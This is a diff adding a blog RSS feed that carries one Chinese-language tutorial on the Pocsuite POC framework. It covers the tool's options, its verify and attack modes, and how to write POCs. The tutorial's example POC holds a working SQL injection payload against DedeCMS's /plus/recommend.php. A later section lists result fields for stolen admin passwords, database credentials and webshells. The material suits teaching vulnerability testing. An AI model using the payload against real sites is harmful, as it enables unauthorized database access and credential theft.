@@ -1,0 +1,221 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>框架 on </title>
+    <link>http://wyb0.com/tags/%E6%A1%86%E6%9E%B6/</link>
+    <description>Recent content in 框架 on </description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
+    <lastBuildDate>Thu, 08 Sep 2016 20:38:45 +0800</lastBuildDate>
+    <atom:link href="http://wyb0.com/tags/%E6%A1%86%E6%9E%B6/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>POC框架Pocsuite</title>
+      <link>http://wyb0.com/posts/POC%E6%A1%86%E6%9E%B6Pocsuite/</link>
+      <pubDate>Thu, 08 Sep 2016 20:38:45 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/POC%E6%A1%86%E6%9E%B6Pocsuite/</guid>
+      <description>
+
+&lt;h3 id=&#34;0x00-关于pocsuite:8260630bb71999ebd7ddfb899c571030&#34;&gt;0x00 关于Pocsuite&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Pocsuite 是知道创宇安全研究团队打造的一款基于漏洞与 POC 的远程漏洞验证框架。可以让我们不用考虑过多的细节，只要考虑验证代码就可以，它封装了一些我们常用的东西，比如requests，在我们平常使用requests是要考虑cookie、要考虑header，但是在框架下则不需要有这些考虑，因为这些东西框架都帮你解决了。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x01-简单介绍:8260630bb71999ebd7ddfb899c571030&#34;&gt;0x01 简单介绍&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;安装
+
+&lt;ul&gt;
+&lt;li&gt;使用pip install pocsuite即可安装
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/pocsuite_install.png&#34; alt=&#34;安装pocsuite&#34;&gt;
+&lt;/div&gt;
+&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;常用参数
+
+&lt;ul&gt;
+&lt;li&gt;-u 指定一个目标url&lt;/li&gt;
+&lt;li&gt;-f 指定一个存放目标url的文件&lt;/li&gt;
+&lt;li&gt;-r 指定一个存放poc的文件夹&lt;/li&gt;
+&lt;li&gt;&amp;ndash;report 导出结果到html文件&lt;/li&gt;
+&lt;li&gt;&amp;ndash;cookie 携带cookie&lt;/li&gt;
+&lt;li&gt;&amp;ndash;referer 修改referer&lt;/li&gt;
+&lt;li&gt;&amp;ndash;user-agent 修改UA&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;模式
+
+&lt;ul&gt;
+&lt;li&gt;执行一个poc有两种模式
+
+&lt;ul&gt;
+&lt;li&gt;--verify 漏洞验证模式(只是验证，不能更改服务器的东西)&lt;/li&gt;
+&lt;li&gt;--attack 漏洞利用模式&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;示例
+
+&lt;ul&gt;
+&lt;li&gt;pocsuite -u &amp;ldquo;&lt;a href=&#34;http://www.xxxx.com&amp;quot;&#34;&gt;http://www.xxxx.com&amp;quot;&lt;/a&gt; -r poc_path/poc_name.py &amp;ndash;atack&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;poc编写&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;可以新建一个文件夹，命名为mypoc，里面就放你自己写的poc(当然也可以在mypoc里新建文件夹放一类poc，对poc进行分类)&lt;/li&gt;
+&lt;li&gt;此时示例(对目标进行常见服务的测试，加载一类多个poc脚本)
+
+&lt;ul&gt;
+&lt;li&gt;pocsuite -u &amp;ldquo;&lt;a href=&#34;http://www.xxxx.com&amp;quot;&#34;&gt;http://www.xxxx.com&amp;quot;&lt;/a&gt; -r poc_path/server/ &amp;ndash;verify&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;poc的命名规范&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;漏洞ID_版本号_漏洞类型(其中不能有大写字母，所有符号要改为&amp;rdquo;_&amp;rdquo;),大致如下：
+
+&lt;ul&gt;
+&lt;li&gt;_xxxx_struct2_2016_s2_016_code_execution.py&lt;/li&gt;
+&lt;li&gt;_xxxx_dedecms_20130715_sql_inj.py&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;poc的编写流程&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;导入pocsuite API模块&lt;/li&gt;
+&lt;li&gt;创建TestPOC类&lt;/li&gt;
+&lt;li&gt;填写POC信息&lt;/li&gt;
+&lt;li&gt;编写_berify()方法&lt;/li&gt;
+&lt;li&gt;编写_attack()方法&lt;/li&gt;
+&lt;li&gt;注册类&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;0x02-实例:8260630bb71999ebd7ddfb899c571030&#34;&gt;0x02 实例&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+# 导入pocsuite的必要模块
+from pocsuite.net import req # requests模块，和requests用法完全一样
+from pocsuite.poc import POCBase, Output
+from pocsuite.utils import register
+
+class TestPOC(POCBase):
+    &amp;quot;&amp;quot;&amp;quot;docstring for TestPOC&amp;quot;&amp;quot;&amp;quot;
+    vulID            = &#39;&#39;      # VUL ID
+    version          = &#39;&#39;      # 版本号,默认为1
+    author           = &#39;&#39;      # POC 作者的大名
+    vulDate          = &#39;&#39;      # 漏洞公开的时间,不知道就写今天
+    createDate       = &#39;&#39;      # 编写 POC 的日期
+    updateDate       = &#39;&#39;      # POC更新的时间,默认和编写时间一样
+    references       = [&#39;&#39;]    # 漏洞地址来源,0day 不用写
+    name             = &#39;&#39;      # POC 名称
+    appPowerLink     = &#39;&#39;      # 漏洞厂商主页地址
+    appName          = &#39;&#39;      # 漏洞应用名称
+    appVersion       = &#39;&#39;      # 漏洞影响版本
+    vulType          = &#39;&#39;      # 漏洞类型,类型参考见 漏洞类型规范表
+    desc             = &#39;&#39;&#39; &#39;&#39;&#39; # 漏洞简要描述
+    samples          = []      # 测试样例,就是用 POC 测试成功的网站url，选填
+    install_requires = []      # POC 第三方模块依赖，请尽量不要使用第三方模块
+
+    def _verify(self, verify=True): # 漏洞测试代码
+        result = {}
+        target_url = self.url
+
+        # 这里写入漏洞测试代码
+        path = &amp;quot;/plus/recommend.php&amp;quot;
+        payload = &amp;quot;?action=&amp;amp;aid=1&amp;amp;_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select md5(512341)),5,6,7,8,9%23@`\\%27`+&amp;amp;_FILES[type][name]=1.jpg&amp;amp;_FILES[type][type]=application/octet-stream&amp;amp;_FILES[type][size]=4294&amp;quot;
+        html = req.get(target_url + path + payload, timeout=10).content
+        if &#39;5e8523b1645e6225001b9027cddc1c85&#39; in html:
+            result[&#39;VerifyInfo&#39;] = {}
+            result[&#39;VerifyInfo&#39;][&#39;URL&#39;] = self.url + path
+            result[&#39;VerifyInfo&#39;][&#39;Path&#39;] = path
+            result[&#39;VerifyInfo&#39;][&#39;Payload&#39;] = payload
+        
+        return self.parse_attack(result)
+
+    def _attack(self): # 漏洞利用代码
+        # result = {}
+        # # 先进行检测是否存在漏洞
+        # if not self._verify(verify=False):
+        #     return self.parse_attack(result)
+        # target_url = self.url
+
+        # # 这里写漏洞利用代码
+
+        # return self.parse_attack(result)
+        
+        return self._verify() # 如果没漏洞利用代码，可以直接return测试函数
+
+    def parse_attack(self, result): # poc输出函数，可以输出错误和成功信息
+        output = Output(self)
+        if result:
+            output.success(result)
+        else:
+            output.fail(&#39;Nothing returned&#39;)
+        return output
+
+register(TestPOC) #注册类
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x03-关于poc中result字典的内容:8260630bb71999ebd7ddfb899c571030&#34;&gt;0x03 关于poc中result字典的内容&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;# result是一个字典，里面存储所有的漏洞信息:
+result：{
+    &#39;DBInfo&#39;: {
+        &#39;Username&#39;: &#39;管理员用户名&#39;,
+        &#39;Password&#39;：&#39;管理员密码&#39;,
+        &#39;Salt&#39;: &#39;加密盐值&#39;,
+        &#39;Uid&#39;: &#39;用户ID&#39;,
+        &#39;Groupid&#39;: &#39;用户组ID&#39;
+        }
+    &#39;ShellInfo&#39;: {
+        &#39;URL&#39;: &#39;Webshell地址&#39;,
+        &#39;Content&#39;: &#39;Webshell内容&#39;
+        }
+    &#39;FileInfo&#39;: {
+        &#39;Filename&#39;: &#39;文件名称&#39;,
+        &#39;Content&#39;: &#39;文件内容&#39;
+        }
+    &#39;XSSInfo&#39;: {
+        &#39;URL&#39;: &#39;验证URL&#39;,
+        &#39;Payload&#39;: &#39;验证Payload&#39;
+        }
+    &#39;AdminInfo&#39;: {
+        &#39;Uid&#39;: &#39;管理员ID&#39;,
+        &#39;Username&#39;: &#39;管理员用户名&#39;,
+        &#39;Password&#39;: &#39;管理员密码&#39;
+        }
+    &#39;Database&#39;: {
+        &#39;Hostname&#39;: &#39;数据库主机名&#39;,
+        &#39;Username&#39;: &#39;数据库用户名&#39; ,
+        &#39;Password&#39;: &#39;数据库密码&#39;,
+        &#39;DBname&#39;: &#39;数据库名&#39;
+        }
+    &#39;VerifyInfo&#39;: {
+        &#39;URL&#39;: &#39;验证URL&#39;,
+        &#39;Postdata&#39;: &#39;验证POST数据&#39;,
+        &#39;Path&#39;: &#39;网站绝对路径&#39;
+        }
+    &#39;SiteAttr&#39;: {
+        &#39;Process&#39;: &#39;服务器进程&#39;
+        }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
